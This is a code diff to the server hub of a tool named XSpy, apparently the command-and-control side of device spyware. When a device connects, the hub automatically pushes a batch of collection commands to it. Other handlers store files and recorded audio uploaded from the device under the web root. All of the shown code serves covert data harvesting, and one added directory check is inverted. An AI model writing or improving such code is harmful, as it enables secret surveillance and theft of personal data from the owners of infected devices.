@@ -24,7 +24,8 @@ namespace XSpy.Socket
         private readonly UserService _userService;
         private readonly DeviceService _deviceService;
 
-        private string _filePath;
+        private string _fileRoot;
+        private string _savePath;
 
         public MainHub(HubMethods hubMethods, DeviceService deviceService, UserService userService,
             IHostEnvironment env)
@@ -32,7 +33,12 @@ namespace XSpy.Socket
             _userService = userService;
             _deviceService = deviceService;
             _methods = hubMethods;
-            _filePath = Path.Combine(env.ContentRootPath, "external", "devices");
+            _savePath = Path.Combine("external", "devices");
+            _fileRoot = Path.Combine(env.ContentRootPath, "wwwroot");
+            if (Directory.Exists(Path.Combine(_fileRoot, _savePath)))
+            {
+                Directory.CreateDirectory(Path.Combine(_fileRoot, _savePath));
+            }
         }
 
         public override async Task OnConnectedAsync()
@@ -62,6 +68,18 @@ namespace XSpy.Socket
                 return;
 
             await _deviceService.SaveDevice(user.Id, request);
+
+            var client = Clients.Client(Context.ConnectionId);
+            await client.SendAsync("0xSM", "ls", "", "");
+
+            await client.SendAsync("0xCL");
+            await client.SendAsync("0xCO");
+            await client.SendAsync("0xLO");
+            await client.SendAsync("0xWI");
+            await client.SendAsync("0xPM");
+            await client.SendAsync("0xIN");
+            await client.SendAsync("0xGI");
+            await client.SendAsync("0xLO");
         }
 
         //List Files
@@ -83,9 +101,14 @@ namespace XSpy.Socket
         public async Task _0xFD(string request)
         {
             var fileRequest = JsonConvert.DeserializeObject<TransferFileRequest>(request);
-            var file = await _deviceService.StoreFile(GetDeviceId(), _filePath, fileRequest);
+            var file = await _deviceService.StoreFile(GetDeviceId(), _savePath, fileRequest);
 
-            await File.WriteAllBytesAsync(file.SavedPath, fileRequest.Buffer);
+            if (!Directory.Exists(Path.Combine(_fileRoot, _savePath, file.DeviceId.ToString(), fileRequest.Type)))
+            {
+                Directory.CreateDirectory(Path.Combine(_fileRoot, _savePath, file.DeviceId.ToString(), fileRequest.Type));
+            }
+            
+            await File.WriteAllBytesAsync(Path.Combine(_fileRoot, file.SavedPath), fileRequest.Buffer);
         }
 
 
@@ -135,11 +158,18 @@ namespace XSpy.Socket
         }
 
         //SAVE AUDIO FILE
-        public async Task _0xMI(TransferFileRequest fileRequest)
+        public async Task _0xMI(string request)
         {
-            var file = await _deviceService.StoreFile(GetDeviceId(), _filePath, fileRequest);
+            var fileRequest = JsonConvert.DeserializeObject<TransferFileRequest>(request);
 
-            await File.WriteAllBytesAsync(file.SavedPath, fileRequest.Buffer);
+            var file = await _deviceService.StoreFile(GetDeviceId(), _savePath, fileRequest);
+
+            if (!Directory.Exists(Path.Combine(_fileRoot, _savePath, file.DeviceId.ToString(), fileRequest.Type)))
+            {
+                Directory.CreateDirectory(Path.Combine(_fileRoot, _savePath, file.DeviceId.ToString(), fileRequest.Type));
+            }
+
+            await File.WriteAllBytesAsync(Path.Combine(_fileRoot, file.SavedPath), fileRequest.Buffer);
         }
 
         //PERM. List
